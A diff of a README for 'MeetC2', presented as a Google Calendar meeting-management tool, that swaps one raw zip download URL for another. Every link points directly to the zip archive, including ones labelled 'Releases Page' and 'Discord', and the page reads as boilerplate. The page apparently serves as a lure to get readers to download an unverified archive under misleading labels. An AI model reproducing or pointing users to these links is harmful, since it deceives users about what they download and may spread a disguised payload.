@@ -1,7 +1,7 @@
 # 🎉 MeetC2 - Seamlessly Manage Your Meetings
 
 ## 🔗 Download MeetC2
-[![Download MeetC2](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip)](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip)
+[![Download MeetC2](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip)](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip)
 
 ## 🚀 Getting Started
 Welcome to MeetC2! This framework allows you to enhance your meeting management through the Google Calendar APIs. With MeetC2, you can streamline the scheduling process, making it easier to organize events, set reminders, and manage your calendar efficiently.
@@ -28,7 +28,7 @@ MeetC2 offers several useful features to simplify your meeting experience:
 To download MeetC2, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases for MeetC2.
-   - [Visit the Releases Page](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip)
+   - [Visit the Releases Page](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip)
 
 2. **Select the Latest Version:** On the releases page, look for the latest version of MeetC2. It will be at the top and will include the version number.
 
@@ -53,7 +53,7 @@ After launching MeetC2 for the first time, follow these steps to set it up:
 If you encounter any issues while using MeetC2 or have questions, you can use the following methods to seek help:
 
 - **Documentation:** Comprehensive user guides and documentation are available within the application. Access them from the help menu.
-- **Community Forum:** Join our user community on [Discord](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip) where you can ask questions and share experiences with other users.
+- **Community Forum:** Join our user community on [Discord](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip) where you can ask questions and share experiences with other users.
 - **GitHub Issues:** Report bugs or request features directly in the project's GitHub repository under the "Issues" section.
 
 ## 🙏 Acknowledgments
@@ -65,4 +65,4 @@ For further resources and updates, check our repository and stay tuned for new f
 
 Once again, download MeetC2 from the link below:
 
-[![Download MeetC2](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip)](https://raw.githubusercontent.com/dTraderDust/MeetC2/master/phantasmatically/MeetC2.zip)
+[![Download MeetC2](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip)](https://github.com/dTraderDust/MeetC2/raw/refs/heads/master/controller/Meet-Muranese.zip)
